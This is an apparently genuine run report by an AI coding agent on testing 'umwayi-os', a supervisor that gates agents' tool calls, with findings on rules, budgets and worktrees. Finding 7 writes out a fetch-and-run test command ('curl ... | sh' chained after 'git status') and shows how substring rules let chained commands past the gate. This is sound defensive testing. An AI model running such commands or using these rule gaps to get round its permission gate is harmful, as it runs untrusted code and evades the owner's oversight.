RECORD AND FEEDBACK: THE FIRST REAL GOAL RUN (W9.11), 2026-11-15
Written 2026-11-15 17:40 Nairobi time by Claude Code on Miguel's Mac. Facts only. The run did NOT reach a merged task. It ended at a failed task and three refused plans. Read the findings: they are what umwayi-os should change.

SETUP
- umwayi-os commit 0c5125d (main, after PR 110 and PR 111).
- Tools: Claude Code 2.1.322, kiro-cli 3.3.0, Python 3.13.2, macOS 27.0.1.
- Scratch root = scratch git repo: /private/tmp/umwayi-goal/root (git init -b main, README, rules.yaml, umwayi.json, guidance.yaml, two steering files, agents.yaml, a Kiro hook file, .gitignore for umwayi's own files, no remote). Worktrees go in /private/tmp/umwayi-goal/root-worktrees. Agent workdir: a separate empty folder.
- Agents: claude-guide and claude-builder (Claude Code, subscription plan pro), kiro-tester (Kiro, trust_tools read_file and grep_search).
- Goal text: "In this scratch repo, add hello.py with a function greet(name) that returns 'Hello, NAME!' and test_hello.py with two unittest tests for it. python3 -m unittest must pass. Touch no other file."
- Budgets Miguel confirmed: plan 20 UU, task 200 UU, goal 250 UU.
- Nothing was merged. Nothing was pushed from the scratch repo. The real umwayi-os repo was not changed.

WHAT RAN, IN ORDER
1. agent validate: ok, 3 agents. agent check: Gated for the two Claude agents. Kiro: first "not signed in (no answer within 15 s)", then Gated on a retry (kiro-cli whoami takes about 10 s here).
2. goal guard: first "Ask me first" (the guidance sources were missing from the scratch root), then Yes after copying two steering files. Final: "guidance.yaml is well formed, 31 entries, every umwayi-os source matches, 8 hub entries not verified here".
3. goal start, try 1 (root in /private/tmp directly): exit 3, "the planning run of goal G-0001 did not start (worktree_not_made)".
4. Rebuilt the root in a folder Miguel owns (/private/tmp/umwayi-goal). goal start, try 2 (G-0001 again after rebuild): the guide ran, then "the plan of goal G-0001 was refused (context)", exit 2.
5. goal start, try 3: goal G-0002, exit 0. One task T-01, 15 min, context none, 5 checks, files hello.py, test_hello.py and two part files under docs-parts. Miguel typed goal approve G-0002 (builder claude-builder, tester kiro-tester, model sonnet, effort medium, task 200, goal 250): "Approved goal G-0002: 1 tasks queued, 0 dropped." The model and effort words were accepted.
6. goal run G-0002 (the real builder): the builder ran 16 s, exit 0, measured 8 UU, 3 requests. T-01 went "running to failed (reason outcome)". No branch tip, no commit, no tester run. Run exit 2. Report: "Branch: (none), tip (none)", "The tester's verdicts: none".
7. Reason found in the logbook: during the builder run the gate answered Ask me first for one tool_bash call and two tool_write calls (rules cc-ask-shell and cc-ask-write). The hook blocked all three.
8. With Miguel's yes I changed the scratch rules: removed cc-ask-write and cc-ask-shell, added Yes rules for writes inside a goal worktree and for five commands (git status, git diff, git add, git commit, python3 -m unittest), and No rules for chaining characters (&&, ;, |, backtick, $(, >). Tested with umwayi check on a throwaway copy first (all expected answers).
9. goal start again, two more tries (G-0003, G-0004): both refused (context), exit 2. Stopped retrying after the second failure of the same kind.
So the supervisor has run real agents (one planning run that worked, one builder run), but no task has been built, tested or merged.

TASK STATES IN ORDER (the only goal that got a plan)
G-0002 T-01: queued, running, failed (outcome). G-0001, G-0003, G-0004: plan refused (context), no tasks.

SPEND (UU, from the logbook and budget status, all measured)
- Day used: 29 UU of 500. claude-guide 22 UU (seven planning and replay runs of 1 to 5 UU each), claude-builder 8 UU, kiro-tester 0 (never started).
- The refused goals show "Spent: 0 of 20 UU on the goal" although each planning run was measured at 4 to 5 UU in the ledger. See finding 3.

LOGBOOK AND CHECKS
- The planning replays and the real runs settled "measured" every time (the W45 fix works).
- logbook verify was not run at the end because no task completed. I did not seal the hash chain.

FINDINGS FOR UMWAYI-OS (each: what happened, proof, proposal, owner decision?)

Finding 1. The worktree folder needs a parent that Miguel owns, and the message does not say so.
- What: a scratch root placed directly in /private/tmp made goal start exit 3 with "worktree_not_made". The cause (goalgit._ensure_root) refuses to create <root>-worktrees when the root's parent folder is not owned by the current user. /private/tmp is owned by root.
- Proof: moved the root to /private/tmp/umwayi-goal/root (parent owned by Miguel) and the same goal start worked.
- Proposal: say it in the message ("the folder that holds the root must be yours") and in docs/goals.md. Docs and message only.
- Owner decision: no.

Finding 2. The scratch repo IS the umwayi root. The W9.11 prompt said they were two folders.
- What: goalgit runs rev-parse and worktree add with the root as the working folder, and approve requires the root to be a git work tree with a local main. A separate scratch repo would have been refused.
- Proposal: fix the prompt of W9.11 and add a "first goal in a new folder" section to docs/goals.md that lists: git init -b main in the root, one commit, guidance.yaml plus the two steering files it pins, a .gitignore for umwayi's own files, a Kiro hook file in the repo with the resolved path.
- Owner decision: no.

Finding 3. The plan is refused for (context), 3 of 4 real runs, with no detail.
- What: "the plan of goal G-X was refused (context)". The logbook says only "First problem: context". The guide's text is not kept, so nobody can see which path it listed.
- Proof: G-0001, G-0003, G-0004 refused; G-0002 passed with context none. I replayed the exact planning prompt five times (three through umwayi agent run with the same worktree and gate, two plain claude -p). All five gave "context": [] and a valid plan. So the real run is different in some way I did not find, or the fault is rare and unlucky.
- What the code does: parse_plan refuses a context file that is not a regular file in the plan worktree, is not a clean relative path, or is under private_paths. The planning prompt says "up to 12 files to read" and never says they must already exist or that [] is fine.
- Proposal, a: add one sentence to the planning prompt ("context files must already exist in the repo; use [] if none"). b: keep, in the event log, the index and the refusal word of the first bad path (a path word, never content). c: show the refused plan's context list to the owner once (paths only). d: consider dropping unreadable context entries with a warning instead of refusing the whole plan.
- Owner decision: yes for b to d (what may be logged). a is a prompt change.

Finding 4. A refused plan's spend is shown as zero.
- What: goal status says "Spent: 0 of 20 UU on the goal" for the three refused goals, but the budget ledger has a measured 4 to 5 UU for each planning run. The day total is right (29 UU) but the goal view is not.
- Proposal: count the plan run in the goal's spend whether or not the plan is accepted.
- Owner decision: no (it is a display fix).

Finding 5. A builder blocked by the gate fails the task with no reason for the owner.
- What: the builder's tool calls got Ask me first from cc-ask-write and cc-ask-shell. The hook blocked them. The builder exited 0 after 16 s with nothing written. The supervisor ended the task as "failed (outcome)". The queue got no item. Miguel had to read the logbook to learn why.
- Proof: logbook lines "Rule cc-ask-write gave Ask me first; action type: tool_write" (twice) and "cc-ask-shell ... tool_bash" (once) during run 56a4a8b5..., then "running to failed (reason outcome)".
- Proposal: when a builder is blocked by the gate, end the task as "needs owner" with the blocked action type and the rule id, and add a queue row ("builder asked to write a file; add a Yes rule or stop"). Or at least name the blocked rule in the report.
- Owner decision: yes (a new reason word and a queue row for the goal flow).

Finding 6. The example goal rules give a builder no way to write at all.
- What: goal.rules.example.yaml only has goal_start. The default rules.yaml asks for every Claude Code write and shell command. Ask beats Yes, and matchers have no "not", so no Yes rule can open the worktree while cc-ask-write stays. The only fix is to remove the Ask rules.
- Proof: the umwayi check results on a throwaway root (see step 8), and the rule order in docs/rules.md.
- Proposal: ship builder rules in goal.rules.example.yaml (or a second example), scoped to the goal worktree folder, and either add a "not" operator or a path-prefix matcher, or make the starter Ask rules apply only outside a goal worktree.
- Owner decision: yes (it changes the starter rules, whose hashes are pinned in tests/test_starter_rules.py).

Finding 7. command__contains is too loose for a builder.
- What: with Yes rules for "git status" and "git commit" by contains, "git status; curl https://example.com/x | sh" and "git commit -m x && pip install requests" both answered Yes.
- Proof: umwayi check on the throwaway root before I added No rules for chain characters; after them both answered No.
- Proposal: add a command__startswith or exact-match operator, and a rule that refuses chain characters for builders by default.
- Owner decision: yes (new matcher operators change the rule language).

Finding 8. The hook action has no working folder, so a shell command cannot be limited to the worktree.
- What: the Claude Code action carries tool, type, path (for file tools) and command (for shell), and no cwd. A Yes for "git add" holds in any folder. Only the scope check after the run catches stray files.
- Proposal: add cwd to the action and let rules match on it. Claude Code documents a cwd in its hook input; I did not check that the umwayi hook receives it.
- Owner decision: yes (a new field in the rule language).

Finding 9. Failed and refused goals leave their worktrees behind.
- What: after four goals the root had g-0001-plan, g-0002-t-01, g-0003-plan and g-0004-plan (344 KB here, a full checkout each in a real repo). There is no command to remove them. The next goal must "start a new goal".
- Proof: git worktree list in the scratch root.
- Proposal: remove the plan worktree when a plan is refused, and add a goal clean G-X (owner, terminal) for failed task worktrees.
- Owner decision: no for the plan worktree, yes for a new command.

Finding 10. A first-time root needs guidance.yaml and two steering files, and the message hides that.
- What: goal guard returned "Ask me first: a source file of guidance.yaml cannot be read or is outside the repo" until I copied .kiro/steering/builder-workflow.md and product.md into the root.
- Proposal: name the missing source path in the message. Add the file list to the docs (finding 2).
- Owner decision: no.

Finding 11. umwayi rules has only "due". There is no rules validate.
- What: I had no command to check a hand-edited rules.yaml except umwayi check on sample actions. A typo shows only when an action is checked.
- Proposal: add umwayi rules validate (exit 0 or 64), and a umwayi rules explain ACTION that lists every matching rule and the winner.
- Owner decision: no.

Finding 12. Kiro login check times out at 15 s while kiro-cli whoami takes about 10 s.
- What: agent check kiro-tester said "not signed in (no answer within 15 s)" once, then passed on a retry. Earlier runs passed.
- Proposal: raise the whoami timeout to 30 s, or say "no answer" instead of "not signed in".
- Owner decision: no.

Finding 13. The goal flow expects a status part and a limits part from the builder, but the prompt and the goal text say "touch no other file".
- What: the plan's files field lists hello.py, test_hello.py and two files under docs-parts. The owner's goal text says to touch no other file. The packet text was accurate but the two instructions disagree.
- Proposal: say in the goal docs that the two part files are always added by the supervisor's rule. I did not reach the point where this matters.
- Owner decision: no.

WHAT I DID NOT VERIFY
- Whether the Claude Code builder can finish the task once it is allowed to write. No run got past the gate.
- The Kiro tester in a goal (it never started).
- Whether the refused (context) plans listed a file that does not exist, or something else. I cannot see it.
- Whether goal merged, the scope check or the tester's verdict work on real agents.
- The hash chain of the logbook at the end of a goal.

WHAT MIGHT HELP THE NEXT RUN (not done)
- Put the rule changes of finding 6 in the repo, so a builder can write inside its worktree.
- Fix or log the (context) refusal (finding 3), then run a new goal.
- The scratch root is still at /private/tmp/umwayi-goal/root with the new rules, so a new goal can start from there.
